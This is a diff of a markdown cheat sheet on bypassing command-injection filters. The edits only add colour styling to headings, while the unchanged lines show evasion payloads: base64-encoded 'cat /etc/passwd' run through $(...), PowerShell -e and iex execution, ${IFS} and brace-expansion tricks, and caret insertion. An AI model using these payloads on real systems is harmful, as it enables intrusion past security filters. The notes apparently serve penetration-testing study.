@@ -4,13 +4,13 @@
 
 ### <mark style="color:blue;">🔍 1. Detecting Filters</mark>
 
-#### 🚫 Filter Types
+#### <mark style="color:green;">🚫 Filter Types</mark>
 
 * **Character Blacklists**: Blocks specific characters (`;`, `&`, `|`, spaces, etc.)
 * **Command Blacklists**: Blocks specific commands (`whoami`, `cat`, etc.)
 * **WAF Detection**: Security mechanisms that deny suspicious requests
 
-#### 🧪 Testing for Filters
+#### <mark style="color:green;">🧪 Testing for Filters</mark>
 
 * 🔄 Try one character at a time to identify which ones are blocked
 * 🔄 Test basic injection operators: `;`, `&&`, `||`, `|`, etc.
@@ -88,7 +88,7 @@
   * Encode: `echo -n 'cat /etc/passwd' | base64` → `Y2F0IC9ldGMvcGFzc3dk`
   * Execute: `$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)`
   * Alternative: `bash <<< $(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)`
-* **🪟 Windows PowerShell**:
+* <mark style="color:green;">**🪟 Windows PowerShell**</mark><mark style="color:green;">:</mark>
   * Encode: `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
   * Execute: `powershell -e dwBoAG8AYQBtAGkA`
   * Alternative: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
@@ -103,14 +103,14 @@
 
 ### <mark style="color:blue;">🚨 9. Quick Reference by OS</mark>
 
-#### 🐧 Linux-Specific Techniques
+#### <mark style="color:green;">🐧 Linux-Specific Techniques</mark>
 
 * Environment variables: `${IFS}`, `${PATH:0:1}`
 * Bash expansion: `{ls,-la}`
 * Command substitution: `$(command)`
 * Character transformation: `$(tr "[A-Z]" "[a-z]" <<<"WhOaMi")`
 
-#### 🪟 Windows-Specific Techniques
+#### <mark style="color:green;">🪟 Windows-Specific Techniques</mark>
 
 * Caret insertion: `w^ho^am^i`
 * Environment variables: `%HOMEPATH:~6,-11%`
